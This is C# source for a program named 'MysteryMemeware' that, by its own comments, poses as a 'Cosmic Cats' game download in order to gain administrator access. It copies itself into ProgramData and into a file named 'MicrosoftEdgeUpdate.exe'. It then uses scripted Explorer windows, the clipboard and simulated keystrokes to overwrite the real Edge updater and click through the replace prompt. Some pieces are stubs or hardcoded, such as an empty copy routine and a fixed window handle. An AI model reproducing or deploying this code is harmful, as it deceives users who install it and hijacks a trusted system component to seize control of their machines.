using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using System.Security.Claims;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Specialized;
using System.Windows.Forms;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.AccountManagement;
using System.ComponentModel;
using System.Management;

namespace MysteryMemeware
{
    public static class CosmicCatsDecoy
    {
        //The intent of module 1 is to insert a copy of the software on the users boot drive in the background to ensure it is not disconnected and to make the UAC show local hard drive instead of network drive.
        public static class Module1
        {
            public const string InstallDirectoryName = "MysteryMemeware";
            public const string InstallFileName = "MysteryMemeware.exe";
            public static void Main()
            {
                string exePath = GetExePath();

                string progamDataDirectory = GetProgramDataPath();

                string installDir = progamDataDirectory + "\\" + InstallDirectoryName;

                try
                {
                    if (System.IO.Directory.Exists(installDir))
                    {
                        System.IO.Directory.Delete(installDir, true);
                    }
                }
                catch
                {

                }

                string installPath = installDir + "\\" + InstallFileName;

                try
                {
                    if (System.IO.File.Exists(installPath))
                    {
                        System.IO.File.Delete(installPath);
                    }
                }
                catch
                {

                }

                CopyFile(exePath, installPath);
            }
            private static void CopyFile(string sourcePath, string destinationPath)
            {

            }
            private static string GetProgramDataPath()
            {
                try
                {
                    string output = System.IO.Path.GetFullPath(System.Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData, System.Environment.SpecialFolderOption.None));
                    if (output[output.Length - 1] is '\\')
                    {
                        output = output.Substring(0, output.Length - 1);
                    }
                    if (output is null || output is "" || !System.IO.Directory.Exists(output))
                    {
                        throw new System.Exception("Generic failure.");
                    }
                    return output;
                }
                catch
                {
                    string output = "C:\\ProgramData";
                    if (output is null || output is "" || !System.IO.Directory.Exists(output))
                    {
                        throw new System.Exception("Generic failure.");
                    }
                    return output;
                }
            }
            private static string GetExePath()
            {
                try
                {
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.GetEntryAssembly();
                    string output = System.IO.Path.GetFullPath(assembly.Location);
                    if (output is null || output is "" || !System.IO.File.Exists(output))
                    {
                        throw new System.Exception("Generic failure.");
                    }
                    return output;
                }
                catch
                {
                    try
                    {
                        string output = System.IO.Path.GetFullPath(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
                        if (output is null || output is "" || !File.Exists(output))
                        {
                            throw new System.Exception("Generic failure.");
                        }
                        return output;
                    }
                    catch
                    {
                        try
                        {
                            System.IntPtr currentProcessHandle = GetCurrentProcess();
                            if (currentProcessHandle == IntPtr.Zero)
                            {
                                throw new System.Exception("Generic failure.");
                            }
                            System.Text.StringBuilder fileNameBuilder = new System.Text.StringBuilder();
                            int bufferLength = fileNameBuilder.Capacity + 1;
                            bool success = QueryFullProcessImageName(currentProcessHandle, 0, fileNameBuilder, ref bufferLength);
                            if (!success)
                            {
                                throw new System.Exception("Generic failure.");
                            }
                            string output = System.IO.Path.GetFullPath(fileNameBuilder.ToString());
                            if (output is null || output is "" || !File.Exists(output))
                            {
                                throw new System.Exception("Generic failure.");
                            }
                            return output;
                        }
                        catch
                        {
                            throw new Exception("All methods failed.");
                        }
                    }
                }
            }
            [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
            private static extern System.IntPtr GetCurrentProcess();
            [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool QueryFullProcessImageName([System.Runtime.InteropServices.In] System.IntPtr hProcess, [System.Runtime.InteropServices.In] int dwFlags, [System.Runtime.InteropServices.Out] System.Text.StringBuilder lpExeName, ref int lpdwSize);
        }
        //Phase one runs when the user first starts runs the application. Phase one is the exe file you download when you want to play Cosmic Cats and is responsible for gaining administrator access in several different ways.
        public static class PhaseOne
        {
            public static readonly string ExplorerFilePath = GetExplorerFilePath();
            private static string GetExplorerFilePath()
            {
                return $"{Environment.GetFolderPath(Environment.SpecialFolder.Windows)}\\explorer.exe";
            }

            public static void Main()
            {
                RunExplorerHack();
                return;
                if (UACHelper.CurrentProcessIsAdmin)
                {
                    return;
                }
                else if (UACHelper.CurrentUserIsAdmin)
                {

                }
                else
                {

                }
            }

            [DllImport("user32.dll")]
            public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            public const uint WM_KEYDOWN = 0x100;
            public const uint WM_KEYUP = 0x0101;
            public static void PasteToExplorer(IntPtr explorerWindowHandle)
            {
                SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_CONTROL, IntPtr.Zero);
                SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_V, IntPtr.Zero);
                SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_V, IntPtr.Zero);
                SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_CONTROL, IntPtr.Zero);
            }
            [DllImport("user32.dll", SetLastError = true)]
            static extern bool SetCursorPos(int x, int y);
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

            public const int KEYEVENT_KEYDOWN = 0x0000;
            public const int KEYEVENT_KEYUP = 0x0002;

            public const int VK_CONTROL = 0xA2;
            public const int VK_V = 0x56;
            public const int VK_ENTER = 0x0D;
            public static IntPtr GetPointer(object obj)
            {
                object pointerTarget = obj;
                TypedReference typedRefrence = __makeref(obj);
                IntPtr pointer;
                unsafe
                {
                    pointer = **(IntPtr**)(&typedRefrence);
                }
                return pointer;
            }
            public static void RunExplorerHack()
            {
                string programLocation = typeof(Program).Assembly.Location;
                string programDirectory = Path.GetDirectoryName(programLocation);
                string imposterLocation = programDirectory + "\\MicrosoftEdgeUpdate.exe";
                if (File.Exists(imposterLocation))
                {
                    File.Delete(imposterLocation);
                }
                File.Copy(programLocation, imposterLocation);
                string edgeUpdatePath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate";
                ProcessHelper.Start(new TerminalCommand($"\"{Environment.GetFolderPath(Environment.SpecialFolder.Windows)}\\explorer.exe\" /e,\"{edgeUpdatePath}\""));
                Process explorer = WaitForExplorerWithTitle(edgeUpdatePath);
                IntPtr shellView = Win32HandleHelper.GetChildWindowByClass(explorer.MainWindowHandle, "SHELLDLL_DefView");
                IntPtr directUI = Win32HandleHelper.GetChildWindowByClass(shellView, "DirectUIHWND");
                Thread.Sleep(1000);
                StringCollection clipboardContents = new StringCollection();
                clipboardContents.Add(imposterLocation);
                Clipboard.SetFileDropList(clipboardContents);
                explorer.WaitForInputIdle();
                WindowHandleInfo windowHandleInfo = new WindowHandleInfo(explorer.MainWindowHandle);
                var  t = windowHandleInfo.GetAllChildHandles();
                PasteToExplorer((IntPtr)3343974);
                Process explorerPopup1 = WaitForExplorerWithTitle("Replace or Skip Files");
                explorer.Kill();
                Thread.Sleep(3000);
                keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
                keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
                Thread.Sleep(3000);
                keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
                keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
                Thread.Sleep(3000);
            }
            public static Process WaitForExplorerWithTitle(string title)
            {
                while (true)
                {
                    Process explorer = GetExplorerByTitle(title);
                    if (!(explorer is null) && !explorer.HasExited)
                    {
                        return explorer;
                    }
                }
            }
            public static List<Process> GetAllExplorers()
            {
                return null;
            }
            public static Process GetShell()
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (process.ProcessName is "explorer")
                        {
                            if (process.MainWindowTitle is "")
                            {
                                return process;
                            }
                        }
                    }
                    catch
                    {

                    }
                }
                return null;
            }
            public static Process GetExplorerByTitle(string title)
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (process.MainModule.FileName == ExplorerFilePath)
                        {
                            if (Win32HandleHelper.GetWindowTitle(process.MainWindowHandle) == title && !process.HasExited)
                            {
                                return process;
                            }
                        }
                    }
                    catch
                    {

                    }
                }
                return null;
            }
            public static void KillAllExplorers()
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (process.ProcessName is "explorer")
                        {
                            process.Kill();
                        }
                    }
                    catch
                    {

                    }
                }
            }


            [StructLayout(LayoutKind.Sequential)]
            private struct ProcessBasicInformation
            {
                public IntPtr Reserved1;
                public IntPtr PebBaseAddress;
                public IntPtr Reserved2_0;
                public IntPtr Reserved2_1;
                public IntPtr UniqueProcessId;
                public IntPtr InheritedFromUniqueProcessId;
            }
            [DllImport("ntdll.dll")]
            private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ProcessBasicInformation processInformation, int processInformationLength, out int returnLength);
            public static Process GetParentProcess(Process process)
            {
                ProcessBasicInformation processBasicInformation = new ProcessBasicInformation();
                int status = NtQueryInformationProcess(process.Handle, 0, ref processBasicInformation, Marshal.SizeOf(processBasicInformation), out int returnLength);
                if (status != 0)
                {
                    throw new Win32Exception(status);
                }
                try
                {
                    return Process.GetProcessById(processBasicInformation.InheritedFromUniqueProcessId.ToInt32());
                }
                catch (ArgumentException)
                {
                    return null;
                }
            }
        }
        #region Public Constants
        public static readonly string ExplorerFilePath = GetExplorerFilePath();
        private static string GetExplorerFilePath()
        {
            return $"{Environment.GetFolderPath(Environment.SpecialFolder.Windows)}\\explorer.exe";
        }
        #endregion
        public static void InjectPayload()
        {
            string programLocation = typeof(Program).Assembly.Location;
            string programDirectory = Path.GetDirectoryName(programLocation);
            string imposterLocation = programDirectory + "\\MicrosoftEdgeUpdate.exe";
            if (File.Exists(imposterLocation))
            {
                File.Delete(imposterLocation);
            }
            File.Copy(programLocation, imposterLocation);
            string edgeUpdatePath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate";
            
            Process parentExplorer = ProcessHelper.Start(new TerminalCommand($"\"C:\\Windows\\explorer.exe\" \"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate\""));
            
            Thread.Sleep(1000);
            List<Process> explorers = GetExplorers();
            Process explorer = WaitForExplorerWithTitle(edgeUpdatePath);
            IntPtr shellView = Win32HandleHelper.GetChildWindowByClass(explorer.MainWindowHandle, "SHELLDLL_DefView");
            IntPtr directUI = Win32HandleHelper.GetChildWindowByClass(shellView, "DirectUIHWND");
            Thread.Sleep(1000);
            StringCollection clipboardContents = new StringCollection();
            clipboardContents.Add(imposterLocation);
            Clipboard.SetFileDropList(clipboardContents);
            explorer.WaitForInputIdle();
            WindowHandleInfo windowHandleInfo = new WindowHandleInfo(explorer.MainWindowHandle);
            var  t = windowHandleInfo.GetAllChildHandles();
            PasteToExplorer((IntPtr)3343974);
            Process explorerPopup1 = WaitForExplorerWithTitle("Replace or Skip Files");
            explorer.Kill();
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
        }
        public static List<Process> GetExplorers()
        {
            List<Process> output = new List<Process>();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        output.Add(process);
                    }
                }
                catch
                {

                }
            }
            return output;
        }
        public static Process GetExplorerByTitle(string title)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.MainModule.FileName == ExplorerFilePath)
                    {
                        if (Win32HandleHelper.GetWindowTitle(process.MainWindowHandle) == title && !process.HasExited)
                        {
                            return process;
                        }
                    }
                }
                catch
                {

                }
            }
            return null;
        }
        public static void KillAllExplorers()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        process.Kill();
                    }
                }
                catch
                {

                }
            }
        }
        public static List<Process> GetChildProcesses(Process process)
        {
            List<Process> children = new List<Process>();
            ManagementObjectSearcher mos = new ManagementObjectSearcher(String.Format("Select * From Win32_Process Where ParentProcessID={0}", process.Id));

            foreach (ManagementObject mo in mos.Get())
            {
                children.Add(Process.GetProcessById(Convert.ToInt32(mo["ProcessID"])));
            }

            return children;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct ProcessBasicInformation
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }
        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ProcessBasicInformation processInformation, int processInformationLength, out int returnLength);
        public static IntPtr GetParentProcess(IntPtr processID)
        {
            ProcessBasicInformation output = new ProcessBasicInformation();
            int status = NtQueryInformationProcess(processID, 0, ref output, Marshal.SizeOf(output), out int returnLength);
            if (status != 0)
            {
                throw new Win32Exception(status);
            }
            return output.InheritedFromUniqueProcessId;
        }
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        public const uint WM_KEYDOWN = 0x100;
        public const uint WM_KEYUP = 0x0101;
        public static void PasteToExplorer(IntPtr explorerWindowHandle)
        {
            SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_CONTROL, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_V, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_V, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_CONTROL, IntPtr.Zero);
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        public const int KEYEVENT_KEYDOWN = 0x0000;
        public const int KEYEVENT_KEYUP = 0x0002;

        public const int VK_CONTROL = 0xA2;
        public const int VK_V = 0x56;
        public const int VK_ENTER = 0x0D;
        public static IntPtr GetPointer(object obj)
        {
            object pointerTarget = obj;
            TypedReference typedRefrence = __makeref(obj);
            IntPtr pointer;
            unsafe
            {
                pointer = **(IntPtr**)(&typedRefrence);
            }
            return pointer;
        }
    }
}